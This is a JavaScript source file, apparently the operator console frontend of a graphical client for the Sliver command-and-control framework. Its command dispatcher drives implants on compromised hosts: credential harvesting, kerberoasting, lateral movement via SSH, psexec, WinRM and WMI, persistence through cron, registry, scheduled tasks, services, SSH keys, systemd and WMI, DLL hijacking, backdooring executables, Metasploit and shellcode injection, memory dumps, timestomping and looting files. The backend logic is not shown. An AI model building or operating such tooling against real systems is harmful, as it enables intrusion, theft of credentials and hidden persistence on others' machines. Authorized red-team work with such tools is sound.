      if (sub === 'start') { await App().StartPivotListener(id, args[1]||'tcp', args[2]||'0.0.0.0:9898'); return appendOut(id, `[+] pivot listener started (${args[1]||'tcp'} ${args[2]||'0.0.0.0:9898'})`, 'out'); }
      if (sub === 'stop')  { await App().StopPivotListener(id, parseInt(args[1])); return appendOut(id, `[+] pivot ${args[1]} stopped`, 'out'); }
      const pv = await App().ListPivots(id);
      return appendOut(id, pv.length ? pv.map(p => `#${p.id} ${p.type} ${p.bindAddress}`).join('\n') : '[*] no pivot listeners', 'info');
    }
    case 'services': {
      const sub = (args[0]||'').toLowerCase();
      if (sub === 'detail' || sub === 'info') {
        if (!args[1]) return appendOut(id, 'usage: services detail <name>', 'err');
        const d = await App().ServiceDetail(id, '', args[1]);
        return appendOut(id, `Name:        ${d.name}\nDisplay:     ${d.displayName}\nStatus:      ${d.status}\nStartup:     ${d.startupType}\nAccount:     ${d.account}\nBinPath:     ${d.binPath}\nDescription: ${d.description}`, 'out');
      }
      if (sub === 'start') {
        if (!args[1]) return appendOut(id, 'usage: services start <name>', 'err');
        await App().StartServiceByName(id, '', args[1]);
        return appendOut(id, `[+] service ${args[1]} start requested`, 'out');
      }
      const svcs = await App().ListServices(id);
      let out = 'STATUS      NAME                           DISPLAY\n';
      svcs.forEach(s => { out += `${(s.status||'').padEnd(12)}${(s.name||'').slice(0,30).padEnd(31)}${s.displayName||''}\n`; });
      return appendOut(id, out.trimEnd(), 'out');
    }
    case 'grep': {
      if (args.length < 2) return appendOut(id, 'usage: grep [-r] <pattern> <path>', 'err');
      const recursive = args[0] === '-r';
      const a2 = recursive ? args.slice(1) : args;
      const pattern = a2[0], path = a2.slice(1).join(' ');
      const res = await App().GrepFiles(id, pattern, path, recursive);
      return appendOut(id, res, 'out');
    }
    case 'mount': {
      const mounts = await App().ListMounts(id);
      if (!mounts.length) return appendOut(id, '[*] no mounts', 'info');
      let out = 'MOUNT           FS         TYPE       LABEL           FREE/TOTAL\n';
      const gb = n => (n/1073741824).toFixed(1)+'G';
      mounts.forEach(m => { out += `${(m.mountPoint||'').slice(0,14).padEnd(16)}${(m.fileSystem||'').padEnd(11)}${(m.type||'').padEnd(11)}${(m.label||'').slice(0,14).padEnd(16)}${m.totalSpace?`${gb(m.freeSpace)}/${gb(m.totalSpace)}`:''}\n`; });
      return appendOut(id, out.trimEnd(), 'out');
    }
    case 'memfiles': {
      const sub = (args[0]||'list').toLowerCase();
      if (sub === 'add') { const fd = await App().MemfilesAdd(id); return appendOut(id, `[+] created memfile fd=${fd}`, 'out'); }
      if (sub === 'rm')  { if (!args[1]) return appendOut(id, 'usage: memfiles rm <fd>', 'err'); await App().MemfilesRm(id, parseInt(args[1])); return appendOut(id, `[+] removed fd=${args[1]}`, 'out'); }
      const res = await App().MemfilesList(id);
      return appendOut(id, res, 'out');
    }
    case 'ssh': {
      if (args.length < 2) return appendOut(id, 'usage: ssh <user>@<host>[:port] <command...>  (prompts nothing; add password with -p <pass>)', 'err');
      let pass = '';
      const pi = args.indexOf('-p');
      if (pi >= 0) { pass = args[pi+1]||''; args.splice(pi, 2); }
      const target = args[0]; const cmd = args.slice(1).join(' ');
      const at = target.split('@'); if (at.length < 2) return appendOut(id, 'usage: ssh <user>@<host>[:port] <command...>', 'err');
      const user = at[0]; const hp = at[1].split(':'); const host = hp[0]; const port = parseInt(hp[1]||'22');
      const r = await App().SSHExec(id, host, port, user, pass, cmd);
      if (r.error) return appendOut(id, `[error] ${r.error}`, 'err');
      if (r.stdout) appendOut(id, r.stdout.trimEnd(), 'out');
      if (r.stderr) appendOut(id, r.stderr.trimEnd(), 'err');
      return;
    }
    case 'wasm': {
      const sub = (args[0]||'list').toLowerCase();
      if (sub === 'register') { if (!args[1]) return appendOut(id, 'usage: wasm register <local.wasm> [name]', 'err'); await App().RegisterWasmExtension(id, args[2]||'', args[1]); return appendOut(id, `[+] registered WASM extension`, 'out'); }
      if (sub === 'exec') { if (!args[1]) return appendOut(id, 'usage: wasm exec <name> [args...]', 'err'); const r = await App().ExecWasmExtension(id, args[1], args.slice(2)); if (r.error) return appendOut(id, `[error] ${r.error}`, 'err'); if (r.stdout) appendOut(id, r.stdout.trimEnd(), 'out'); if (r.stderr) appendOut(id, r.stderr.trimEnd(), 'err'); return; }
      const names = await App().ListWasmExtensions(id);
      return appendOut(id, names.length ? names.join('\n') : '[*] no WASM extensions registered', names.length?'out':'info');
    }
    case 'ping': {
      const t0 = Date.now();
      try { await App().PingSession(id); return appendOut(id, `[+] pong (${Date.now()-t0}ms)`, 'out'); }
      catch (e) { return appendOut(id, `[error] ${e}`, 'err'); }
    }
    case 'execute-windows': case 'execw': {
      const useToken = args.includes('-t'), hide = args.includes('-H');
      let ppid = 0; const pi = args.indexOf('--ppid'); if (pi >= 0) { ppid = parseInt(args[pi+1])||0; }
      const rest = args.filter((a,idx) => !a.startsWith('-') && !(pi>=0 && idx===pi+1));
      if (!rest.length) return appendOut(id, 'usage: execute-windows [-t] [-H] [--ppid <pid>] <path> [args...]', 'err');
      const r = await App().ExecuteWindowsAdvanced(id, rest[0], rest.slice(1), useToken, hide, ppid);
      if (r.error) return appendOut(id, `[error] ${r.error}`, 'err');
      if (r.stdout) appendOut(id, r.stdout.trimEnd(), 'out');
      if (r.stderr) appendOut(id, r.stderr.trimEnd(), 'err');
      return;
    }
    case 'wg-forwarders': {
      const f = await App().ListWGForwarders(id);
      return appendOut(id, f.length ? f.map(x => `#${x.id} ${x.localAddr} -> ${x.remoteAddr}`).join('\n') : '[*] no WG forwarders', f.length?'out':'info');
    }
    case 'wg-list-socks': {
      const s = await App().ListWGSocks(id);
      return appendOut(id, s.length ? s.map(x => `#${x.id} ${x.localAddr}`).join('\n') : '[*] no WG socks servers', s.length?'out':'info');
    }
    case 'close': {
      if (kind !== 'session') return appendOut(id, '[!] close applies to sessions (use kill-beacon for beacons)', 'err');
      await App().CloseSessionGraceful(id);
      return appendOut(id, '[+] session close requested (graceful)', 'out');
    }
    case 'mkdir': {
      if (!args[0]) return appendOut(id, 'usage: mkdir <path>', 'err');
      await App().MakeDirectory(id, args[0]);
      return appendOut(id, `[+] created ${args[0]}`, 'out');
    }
    case 'rm': case 'rmdir': {
      if (!args[0]) return appendOut(id, 'usage: rm <path>', 'err');
      await App().RemoveFile(id, args[0]);
      return appendOut(id, `[+] removed ${args[0]}`, 'out');
    }
    case 'setenv': {
      if (args.length < 2) return appendOut(id, 'usage: setenv <KEY> <VALUE>', 'err');
      await App().SetEnvVar(id, args[0], args.slice(1).join(' '));
      return appendOut(id, `[+] ${args[0]} set`, 'out');
    }
    case 'unsetenv': {
      if (!args[0]) return appendOut(id, 'usage: unsetenv <KEY>', 'err');
      await App().UnsetEnvVar(id, args[0]);
      return appendOut(id, `[+] ${args[0]} unset`, 'out');
    }
    case 'getenv': {
      const vars = await App().GetEnvVars(id);
      const filtered = args[0] ? vars.filter(v => v.key.toLowerCase().includes(args[0].toLowerCase())) : vars;
      return appendOut(id, filtered.map(v => `${v.key}=${v.value}`).join('\n') || '[*] no match', 'out');
    }
    case 'reg': {
      const sub = (args[0]||'').toLowerCase();
      if (sub === 'query') {
        if (!args[1]) return appendOut(id, 'usage: reg query <HIVE> <path>  (HIVE: HKLM HKCU HKCR HKU HKCC)', 'err');
        const vals = await App().RegistryListValues(id, args[1], args.slice(2).join(' '));
        let out = 'NAME                 TYPE        VALUE\n';
        vals.forEach(v => { out += `${(v.name||'(default)').slice(0,20).padEnd(21)}${(v.type||'').padEnd(12)}${v.value||''}\n`; });
        return appendOut(id, out.trimEnd(), 'out');
      }
      if (sub === 'read') { const v = await App().RegistryReadValue(id, args[1], args[2], args[3]); return appendOut(id, v, 'out'); }
      if (sub === 'write') { await App().RegistryWriteValue(id, args[1], args[2], args[3], args.slice(4).join(' ')); return appendOut(id, '[+] value written', 'out'); }
      if (sub === 'read-hive') {
        if (!args[1]) return appendOut(id, 'usage: reg read-hive <ROOT_HIVE> [requested_hive]', 'err');
        const p = await App().RegistryReadHiveExport(id, args[1], args[2]||'');
        return appendOut(id, `[+] hive saved to ${p}`, 'out');
      }
      return appendOut(id, 'usage: reg query|read|write|read-hive <HIVE> <path> [key] [value]', 'err');
    }
    case 'execute': {
      // execute [-o|-e|-t|-s ...] <path> [args] — run a program directly (no shell)
      const rest = args.filter(a => !a.startsWith('-'));
      if (!rest.length) return appendOut(id, 'usage: execute [-o] <path> [args...]', 'err');
      const r = await App().RunExecute(id, rest[0], rest.slice(1));
      if (r.error) return appendOut(id, `[error] ${r.error}`, 'err');
      if (r.stdout) appendOut(id, r.stdout.trimEnd(), 'out');
      if (r.stderr) appendOut(id, r.stderr.trimEnd(), 'err');
      if (r.status && r.status !== 0) appendOut(id, `[exit ${r.status}]`, 'err');
      return;
    }
    case 'cat': {
      if (!args[0]) return appendOut(id, 'usage: cat <remote_path>', 'err');
      const txt = await App().ReadRemoteFile(id, args.join(' '));
      return appendOut(id, txt || '(empty file)', 'out');
    }
    case 'mv': {
      if (args.length < 2) return appendOut(id, 'usage: mv <src> <dst>', 'err');
      await App().MoveFile(id, args[0], args[1]);
      return appendOut(id, `[+] ${args[0]} -> ${args[1]}`, 'out');
    }
    case 'cp': {
      if (args.length < 2) return appendOut(id, 'usage: cp <src> <dst>', 'err');
      const n = await App().CopyFile(id, args[0], args[1]);
      return appendOut(id, `[+] copied ${fmtSize(n)} ${args[0]} -> ${args[1]}`, 'out');
    }
    case 'ifconfig': case 'ipconfig': {
      const ifs = await App().Ifconfig(id);
      let out = '';
      ifs.forEach(i => { out += `${i.name}${i.mac ? '  ('+i.mac+')' : ''}\n${(i.ips||[]).map(a => '    '+a).join('\n')}\n`; });
      return appendOut(id, out.trimEnd() || '(no interfaces)', 'out');
    }
    case 'getprivs': {
      const r = await App().GetPrivs(id);
      let out = `Process: ${r.processName}   Integrity: ${r.integrity}\n\nPRIVILEGE                          ENABLED\n`;
      (r.privs||[]).forEach(p => { out += `${(p.name||'').padEnd(35)}${p.enabled ? 'yes' : 'no'}\n`; });
      return appendOut(id, out.trimEnd(), 'out');
    }
    case 'procdump': {
      if (!args[0]) return appendOut(id, 'usage: procdump <pid>', 'err');
      appendOut(id, '[*] dumping process memory...', 'pending');
      const r = await App().ProcessDump(id, parseInt(args[0]));
      return appendOut(id, r.error ? `[error] ${r.error}` : `[+] dumped ${fmtSize(r.bytes)} -> ${r.path}`, r.error?'err':'out');
    }
    case 'extensions': case 'ext-list': {
      const installed = await App().ListInstalledExtensions().catch(() => []);
      const loaded = await App().ListImplantExtensions(id).catch(() => []);
      let out = 'INSTALLED COMMANDS  (run with:  ext <command> [args...])\n';
      if (!installed.length) out += '  (none installed — use the Sliver CLI: armory install <name>)\n';
      installed.forEach(e => out += `  ${(e.command||'').padEnd(20)}${e.isBof?'[BOF] ':'      '}${e.args||''}${e.help?('  — '+e.help):''}\n`);
      out += `\nLOADED IN THIS IMPLANT:  ${loaded && loaded.length ? loaded.join(', ') : '(none yet)'}`;
      return appendOut(id, out, 'out');
    }
    case 'ext': {
      if (!args[0]) return appendOut(id, 'usage: ext <command> [args...]   (list them with: extensions)', 'err');
      appendOut(id, `[*] running extension '${args[0]}'...`, 'pending');
      const r = await App().RunExtension(id, args[0], args.slice(1)).then(o => ({ o })).catch(e => ({ err: String(e) }));
      if (r.err) return appendOut(id, `[error] ${r.err}`, 'err');
      return appendOut(id, (r.o && r.o.trim()) ? r.o.trimEnd() : '[+] executed (no output)', 'out');
    }
    case 'backdoor': {
      if (args.length < 2) return appendOut(id, 'usage: backdoor <remote_pe_path> <profile>', 'err');
      const err = await App().Backdoor(id, args[0], args[1]).then(()=>null).catch(e=>String(e));
      return appendOut(id, err ? `[error] ${err}` : `[+] backdoored ${args[0]} with profile ${args[1]}`, err?'err':'out');
    }
    case 'dllhijack': {
      if (args.length < 3) return appendOut(id, 'usage: dllhijack <reference_dll> <target_location> <profile>', 'err');
      const err = await App().DllHijack(id, args[0], args[1], args[2]).then(()=>null).catch(e=>String(e));
      return appendOut(id, err ? `[error] ${err}` : `[+] DLL hijack planted at ${args[1]}`, err?'err':'out');
    }
    case 'msf': {
      if (args.length < 3) return appendOut(id, 'usage: msf <payload> <lhost> <lport>   (e.g. windows/x64/meterpreter/reverse_tcp)', 'err');
      const err = await App().MsfInject(id, args[0], args[1], parseInt(args[2])).then(()=>null).catch(e=>String(e));
      return appendOut(id, err ? `[error] ${err}` : '[+] msf payload staged into the implant process', err?'err':'out');
    }
    case 'msf-inject': {
      if (args.length < 4) return appendOut(id, 'usage: msf-inject <payload> <lhost> <lport> <pid>', 'err');
      const err = await App().MsfRemoteInject(id, args[0], args[1], parseInt(args[2]), parseInt(args[3])).then(()=>null).catch(e=>String(e));
      return appendOut(id, err ? `[error] ${err}` : `[+] msf payload injected into PID ${args[3]}`, err?'err':'out');
    }
    case 'wg-portfwd': {
      const sub = (args[0]||'').toLowerCase();
      if (sub === 'add') { await App().WGStartPortForward(id, parseInt(args[1]), args[2]); return appendOut(id, `[+] WG forward 127.0.0.1:${args[1]} -> ${args[2]}`, 'out'); }
      if (sub === 'rm')  { await App().WGStopPortForward(id, parseInt(args[1])); return appendOut(id, `[+] WG forward ${args[1]} stopped`, 'out'); }
      return appendOut(id, 'usage: wg-portfwd add <lport> <remoteHost:port> | rm <id>', 'err');
    }
    case 'wg-socks': {
      const sub = (args[0]||'').toLowerCase();
      if (sub === 'stop') { await App().WGStopSocks(id, parseInt(args[1])); return appendOut(id, `[+] WG socks ${args[1]} stopped`, 'out'); }
      await App().WGStartSocks(id, parseInt(args[0])||1081);
      return appendOut(id, `[+] WG SOCKS proxy on 127.0.0.1:${parseInt(args[0])||1081}`, 'out');
    }
    case 'loot': {
      const sub = (args[0]||'').toLowerCase();
      if (sub === 'add') {
        if (!args[1]) return appendOut(id, 'usage: loot add <remote_path>', 'err');
        appendOut(id, `[*] looting ${args[1]}...`, 'pending');
        const err = await App().LootFile(id, args.slice(1).join(' ')).then(() => null).catch(e => String(e));
        return appendOut(id, err ? `[error] ${err}` : `[+] added ${args[1]} to the shared loot store`, err?'err':'out');
      }
      if (sub === 'rm') { await App().DeleteLoot(args[1]); return appendOut(id, `[+] loot ${args[1]} removed`, 'out'); }
      const loot = await App().GetLoot().catch(() => []);
      if (!loot.length) return appendOut(id, '[*] loot store is empty (use: loot add <remote_path>)', 'info');
      let out = 'ID            TYPE        NAME\n';
      loot.forEach(l => { out += `${(l.id||'').slice(0,12).padEnd(14)}${(l.type||'').padEnd(12)}${l.name||''}\n`; });
      return appendOut(id, out.trimEnd(), 'out');
    }
    case 'runas': {
      let user='', pass='', dom='', rest=[];
      for (let i=0;i<args.length;i++){ if(args[i]==='-u')user=args[++i]||''; else if(args[i]==='-p')pass=args[++i]||''; else if(args[i]==='-d')dom=args[++i]||''; else rest.push(args[i]); }
      if(!user || !rest.length) return appendOut(id, 'usage: runas -u [DOMAIN\\]<user> [-p <pass>] <program> [args]', 'err');
      // Split DOMAIN\user (or user@domain) into separate domain + username.
      if (user.includes('\\')) { const p = user.split('\\'); dom = dom || p[0]; user = p[1]; }
      else if (user.includes('@')) { const p = user.split('@'); user = p[0]; dom = dom || p[1]; }
      if (!dom) dom = '.';   // local account
      const outp = await App().RunAs(id, user, dom, pass, rest[0], rest.slice(1).join(' '));
      return appendOut(id, outp || '[+] done', 'out');
    }
    case 'migrate': {
      if (args.length < 2) return appendOut(id, 'usage: migrate <pid> <profile>  (profile = a saved implant profile)', 'err');
      const err = await App().Migrate(id, parseInt(args[0]), args[1]).then(()=>null).catch(e=>String(e));
      return appendOut(id, err ? `[error] ${err}` : `[+] migration into PID ${args[0]} requested`, err?'err':'out');
    }
    case 'execute-shellcode': {
      // execute-shellcode <local-path> [pid]   (no path = file dialog)
      appendOut(id, args.length ? `[*] injecting ${args[0]}...` : '[*] no path given — opening file dialog...', 'pending');
      const r = await App().ExecuteShellcode(id, args[0] || '', parseInt(args[1])||0);
      return appendOut(id, r.error ? `[error] ${r.error}` : (r.output||'[+] done'), r.error?'err':'out');
    }
    case 'spawndll': {
      // spawndll <local-path> [args]   (no path = file dialog)
      appendOut(id, args.length ? `[*] spawning ${args[0]}...` : '[*] no path given — opening file dialog...', 'pending');
      const r = await App().SpawnDll(id, args[0] || '', args.slice(1).join(' '), '');
      return appendOut(id, r.error ? `[error] ${r.error}` : (r.output||'[+] done'), r.error?'err':'out');
    }
    case 'chmod': { if (args.length < 2) return appendOut(id, 'usage: chmod <path> <mode>  (e.g. 0755)', 'err'); await App().Chmod(id, args[0], args[1]); return appendOut(id, `[+] chmod ${args[1]} ${args[0]}`, 'out'); }
    case 'chown': { if (args.length < 3) return appendOut(id, 'usage: chown <path> <uid> <gid>', 'err'); await App().Chown(id, args[0], args[1], args[2]); return appendOut(id, `[+] chown ${args[1]}:${args[2]} ${args[0]}`, 'out'); }
    case 'chtimes': case 'timestomp': {
      if (args.length < 2) return appendOut(id, 'usage: chtimes <path> <YYYY-MM-DD HH:MM:SS>', 'err');
      const ts = Math.floor(new Date(args.slice(1).join(' ')).getTime()/1000);
      if (isNaN(ts)) return appendOut(id, 'invalid date — use e.g. 2021-01-01 09:00:00', 'err');
      await App().Chtimes(id, args[0], ts, ts);
      return appendOut(id, `[+] timestomped ${args[0]} -> ${args.slice(1).join(' ')}`, 'out');
    }
    case 'rportfwd': {
      const sub = (args[0]||'').toLowerCase();
      if (sub === 'add') { await App().StartRportFwd(id, '0.0.0.0', parseInt(args[1]), args[2], parseInt(args[3])); return appendOut(id, `[+] reverse forward: target :${args[1]} -> ${args[2]}:${args[3]}`, 'out'); }
      if (sub === 'rm') { await App().StopRportFwd(id, parseInt(args[1])); return appendOut(id, `[+] removed reverse forward ${args[1]}`, 'out'); }
      const fwds = await App().ListRportFwds(id);
      return appendOut(id, fwds.length ? fwds.map(f => `#${f.id} ${f.bind} -> ${f.forward}`).join('\n') : '[*] no reverse port forwards', 'info');
    }
    case 'getpid': return appendOut(id, String(tab.obj.pid), 'out');
    case 'getuid': case 'getgid': return dispatchCmd(kind, id, 'whoami');
    // ── Script commands (spawn / jump / persist / harvest / scan) ──
    case 'spawn': case 'jump': {
      // TWO modes:
      // 1) Local spawn (no creds): spawn <os> <arch> <listener_type>
      //    e.g. spawn windows x64 http
      //    e.g. spawn linux x64 mtls
      // 2) Remote spawn (with target): spawn linux user@host -p pass listener_url
      //    e.g. spawn linux root@192.168.50.20 -p toor mtls://...

      const sub = args[0] || '';

      // Detect mode: if no '@' in any arg and sub is an OS name → LOCAL spawn
      const hasTarget = args.some(a => a.includes('@'));
      const isLocalSpawn = !hasTarget && (sub === 'windows' || sub === 'linux' || sub === 'win' || sub === 'lin') && cmd === 'spawn';

      if (isLocalSpawn) {
        // spawn <os> <arch> <profile_name>
        const osTarget = (sub === 'win') ? 'windows' : sub;
        const archVal = args[1] || 'x64';
        const profile = args[2] || '';
        if (!profile) return appendOut(id, `usage: spawn ${osTarget} ${archVal} <profile_name>\n\nCreate a profile first:\n  Profiles panel → Create\n  Or: profiles new --mtls host:port --os ${osTarget} --beacon --name my-profile`, 'err');
        appendOut(id, `[*] Spawning ${osTarget}/${archVal} from profile '${profile}' on current host...`, 'pending');
        const r = await App().ScriptSpawnLocal(id, osTarget, archVal, profile);
        if (!r.error) renderGraph();
        return appendOut(id, r.error ? `[error] ${r.error}` : r.output, r.error?'err':'out');
      }

      // Remote spawn / jump
      let targetStr = args[1] || '';
      let pass = '';
      const pi2 = args.indexOf('-p');
      if (pi2 >= 0) { pass = args[pi2+1]||''; args.splice(pi2, 2); targetStr = args[1]||''; }
      const listenerUrl = args[args.length-1] || '';
      // Parse user@host:port
      let user = 'root', host = '', port = 22;
      if (targetStr.includes('@')) { const p = targetStr.split('@'); user = p[0]; const hp = p[1].split(':'); host = hp[0]; if (hp[1]) port = parseInt(hp[1]); }
      else { host = targetStr; }
      if (!host || !listenerUrl) return appendOut(id, `usage:\n  ${cmd} <os> <arch> <listener>  (local spawn)\n  ${cmd} linux|windows <user>@<host> [-p <pass>] <listener_url>  (remote)`, 'err');
      appendOut(id, `[*] ${cmd} ${sub} → ${user}@${host}:${port} via ${listenerUrl}`, 'pending');
      let r;
      if (sub === 'linux' || sub === 'ssh') {
        r = await App().ScriptSpawnLinux(id, host, port, user, pass, listenerUrl);
      } else if (sub === 'windows' || sub === 'psexec' || sub === 'psexec64') {
        r = await App().ScriptSpawnWindows(id, host, port, user, pass, listenerUrl);
      } else if (sub === 'winrm') {
        r = await App().ScriptWinRMExec(id, host, port, user, pass, listenerUrl);
      } else if (sub === 'wmi') {
        r = await App().ScriptWMIExec(id, host, port, user, pass, listenerUrl);
      } else {
        return appendOut(id, `unknown type: ${sub}. Use: linux, windows, ssh, psexec, winrm, wmi`, 'err');
      }
      if (!r.error) {
        // Every jump records lateral-move lineage (source → target) so the graph
        // shows where the operator moved from. The pivot is authoritative and the
        // wouldCycle guard in renderGraph prevents a jump from flipping a chain.
        if (host) recordJump(id, host);
        renderGraph();
      }
      return appendOut(id, r.error ? `[error] ${r.error}` : r.output, r.error?'err':'out');
    }
    case 'privesc-check': case 'privesc': {
      appendOut(id, '[*] Running privilege escalation checks...', 'pending');
      const os = (tab.obj && tab.obj.os || '').toLowerCase();
      const r = os.includes('windows') ? await App().ScriptWinPrivescCheck(id) : await App().ScriptPrivescCheck(id);
      return appendOut(id, r.error ? `[error] ${r.error}` : r.output, r.error?'err':'out');
    }
    case 'harvest': {
      appendOut(id, '[*] Harvesting credentials...', 'pending');
      const os = (tab.obj && tab.obj.os || '').toLowerCase();
      const r = os.includes('windows') ? await App().ScriptWinHarvestCreds(id) : await App().ScriptHarvestCreds(id);
      return appendOut(id, r.error ? `[error] ${r.error}` : r.output, r.error?'err':'out');
    }
    case 'ad-enum': case 'adenum': {
      appendOut(id, '[*] Enumerating Active Directory...', 'pending');
      const r = await App().ScriptADEnum(id);
      return appendOut(id, r.error ? `[error] ${r.error}` : r.output, r.error?'err':'out');
    }
    case 'local-enum': case 'localenum': {
      appendOut(id, '[*] Running local enumeration...', 'pending');
      const os = (tab.obj && tab.obj.os || '').toLowerCase();
      const r = os.includes('windows') ? await App().ScriptWinLocalEnum(id) : await App().ScriptPrivescCheck(id);
      return appendOut(id, r.error ? `[error] ${r.error}` : r.output, r.error?'err':'out');
    }
    case 'kerberoast': {
      appendOut(id, '[*] Kerberoasting...', 'pending');
      const r = await App().ScriptKerberoast(id);
      return appendOut(id, r.error ? `[error] ${r.error}` : r.output, r.error?'err':'out');
    }
    case 'persist': {
      const sub = (args[0]||'').toLowerCase();
      if (sub === 'cron') { const r = await App().ScriptPersistCron(id, args.slice(1).join(' ')); return appendOut(id, r.output||r.error, r.error?'err':'out'); }
      if (sub === 'reg') { const r = await App().ScriptPersistRegRun(id, args[2]||'', args[1]||''); return appendOut(id, r.output||r.error, r.error?'err':'out'); }
      if (sub === 'schtask') { const r = await App().ScriptPersistSchedTask(id, args[2]||'', args[1]||''); return appendOut(id, r.output||r.error, r.error?'err':'out'); }
      if (sub === 'service') { const r = await App().ScriptPersistService(id, args[2]||'', args[1]||''); return appendOut(id, r.output||r.error, r.error?'err':'out'); }
      if (sub === 'ssh-key') { const r = await App().ScriptPersistSSHKey(id, args.slice(1).join(' '), 'root'); return appendOut(id, r.output||r.error, r.error?'err':'out'); }
      if (sub === 'systemd') { const r = await App().ScriptPersistSystemd(id, args[1]||'', args[2]||''); return appendOut(id, r.output||r.error, r.error?'err':'out'); }
      if (sub === 'wmi') { const r = await App().ScriptPersistWMI(id, args[1]||''); return appendOut(id, r.output||r.error, r.error?'err':'out'); }
      if (sub === 'startup') { const r = await App().ScriptPersistStartup(id, args[1]||''); return appendOut(id, r.output||r.error, r.error?'err':'out'); }
      return appendOut(id, 'usage: persist cron|reg|schtask|service|ssh-key|systemd|wmi|startup [args]', 'err');
    }
    case 'scan': {
      const subnet = args[0] || '192.168.50';
      const ports = args.slice(1).join(' ') || '22 445 3306 2375 3000 8080';
      appendOut(id, `[*] Scanning ${subnet}.0/24 ports: ${ports}...`, 'pending');
      const r = await App().ScriptNetworkScan(id, subnet, ports);
      return appendOut(id, r.error ? `[error] ${r.error}` : r.output, r.error?'err':'out');
    }
    default: {
      // Server/panel commands are not session commands — guide instead of
      // silently running them in cmd.exe.
      const serverCmds = { sessions:1, beacons:1, jobs:1, listeners:1, generate:1, profiles:1, builds:1, 'implant-builds':1, operators:1, hosts:1, use:1, background:1, players:1, 'new-operator':1 };
      if (serverCmds[cmd]) {
        return appendOut(id, `[!] '${cmd}' is a server/management command — use the toolbar at the top (this console runs commands on the target). Type 'help' for session commands, or 'shell ${raw}' to force an OS shell.`, 'err');
      }
      // Otherwise run it in the target's OS shell (cmd.exe / /bin/sh).
      const shellCmd = cmd === 'shell' ? args.join(' ') : raw;
      if (!shellCmd.trim()) return;
      const r = await App().ExecuteCommand(id, shellCmd).catch(e => ({ error: String(e) }));
      if (r.error) return appendOut(id, `[error] ${r.error}`, 'err');
      if (r.stdout) appendOut(id, r.stdout.trimEnd(), 'out');
      if (r.stderr) appendOut(id, r.stderr.trimEnd(), 'err');
      if (r.status && r.status !== 0) appendOut(id, `[exit ${r.status}]`, 'err');
      return;
    }
  }
}

// pollBeaconResult polls the beacon task queue until the given task completes,
// then prints its output. Non-blocking — the console stays usable meanwhile.
// It uses the task LIST to detect state (reliable), then fetches the full body
// via GetBeaconTaskResult only once the task is completed.
function pollBeaconResult(id, taskId, tries = 0) {
  if (!openTabs[id]) return;               // tab closed — stop
  if (tries > 120) { appendOut(id, `[*] task ${taskId.slice(0,8)} still pending — the beacon has not checked in yet (interval/jitter). Use 'tasks' to check later.`, 'pending'); return; }
  setTimeout(async () => {
    const tasks = await App().GetBeaconTasks(id).catch(() => null);
    if (!tasks) { pollBeaconResult(id, taskId, tries + 1); return; }
    const t = tasks.find(x => x.id === taskId);
    if (!t) { pollBeaconResult(id, taskId, tries + 1); return; }
    if (t.state === 'completed') {
      const full = await App().GetBeaconTaskResult(taskId).catch(() => null);
      appendOut(id, `[+] task ${taskId.slice(0,8)} completed`, 'ok');
      appendOut(id, (((full && full.response) || t.response) || '(no output)').trimEnd(), 'out');
    } else if (t.state === 'failed' || t.state === 'canceled') {
      appendOut(id, `[error] task ${t.state}`, 'err');
    } else {
      pollBeaconResult(id, taskId, tries + 1);
    }
  }, 3000);
}

async function showTasks(id) {
  const tasks = await App().GetBeaconTasks(id).catch(e => { appendOut(id, `[error] ${e}`, 'err'); return null; });
  if (!tasks) return;
  if (!tasks.length) { appendOut(id, '[*] no tasks in queue', 'info'); return; }
  let out = 'ID        State       Created   Completed  Description\n';
  out +=    '--------  ----------  --------  ---------  -----------\n';
  tasks.forEach(t => {
    out += `${(t.id||'').slice(0,8).padEnd(10)}${(t.state||'').padEnd(12)}${(t.createdAt||'').padEnd(10)}${(t.completedAt||'').padEnd(11)}${t.description||''}\n`;
    if (t.response && t.state === 'completed') out += `  > ${t.response.slice(0,200)}\n`;
  });
  appendOut(id, out.trimEnd(), 'out');
}

function fmtSize(b) { if (!b) return '0B'; if (b<1024) return b+'B'; if (b<1048576) return (b/1024).toFixed(1)+'K'; return (b/1048576).toFixed(1)+'M'; }
function appendImg(id, dataUrl) {
  const out = document.getElementById(`cout-${id}`); if (!out) return;
  const img = document.createElement('img'); img.src = dataUrl;
  img.style.cssText = 'max-width:100%;border:1px solid var(--border);border-radius:4px;margin:6px 0;display:block;';
  out.appendChild(img); out.scrollTop = out.scrollHeight;
}
function appendOut(id, text, cls) {
  const out = document.getElementById(`cout-${id}`); if (!out) return;
  const s = document.createElement('span'); s.className = cls||'out'; s.textContent = text + '\n';
  out.appendChild(s); out.scrollTop = out.scrollHeight;
}

// ── Interactive shell (real-time PTY over a tunnel) ─────────────────────────
// Opens as a pinned docked tab (named by machine), like the per-agent console
// and server console — not a floating popup.
async function openInteractiveShell(agentId, obj) {
  const host = obj ? (obj.hostname || obj.id.slice(0,8)) : agentId;
  const isWin = obj && (obj.os||'').toLowerCase().includes('windows');
  let tid;
  try {
    tid = await App().StartInteractiveShell(agentId, '', !isWin);  // '' = implant default shell
  } catch (e) {
    return appendOut(agentId, `[error] could not start shell: ${e}`, 'err');
  }

  const dockId = `shell-${tid}`;
  const evtOut = `sliver:shell:${tid}`, evtClose = `sliver:shell-closed:${tid}`;
  // Register as a shell tab so closeTab() can tear the tunnel down.
  openTabs[dockId] = { kind: 'shell', tid, evtOut, evtClose };
  document.getElementById('empty-interact')?.remove();

  // Tab: named by machine, with a shell glyph.
  const tab = document.createElement('button'); tab.className = 'interact-tab'; tab.dataset.tid = dockId;
  tab.innerHTML = `<span>▸ ${esc(host)}</span><span class="close-x" data-cid="${dockId}">x</span>`;
  tab.addEventListener('click', e => { if (e.target.dataset.cid) closeTab(e.target.dataset.cid); else activateTab(dockId); });
  document.getElementById('interact-tabs').appendChild(tab);

  // Panel: streaming output + input line.
  const outId = `sh-out-${tid}`, inId = `sh-in-${tid}`;
  const panel = document.createElement('div'); panel.className = 'interact-panel'; panel.id = `ip-${dockId}`;
  panel.innerHTML =
    `<pre id="${outId}" class="shell-out"><span class="info">[*] interactive shell on ${esc(host)} — type 'exit' or close the tab to end.\n</span></pre>
     <input id="${inId}" class="shell-in" placeholder="type a command and press Enter…" autocomplete="off" spellcheck="false"/>`;
  document.getElementById('interact-panels').appendChild(panel);

  const outEl = document.getElementById(outId), inEl = document.getElementById(inId);
  const append = t => { if (!outEl) return; outEl.appendChild(document.createTextNode(t)); outEl.scrollTop = outEl.scrollHeight; };
  const onData = b64 => { try { append(decodeB64(b64)); } catch(e){} };
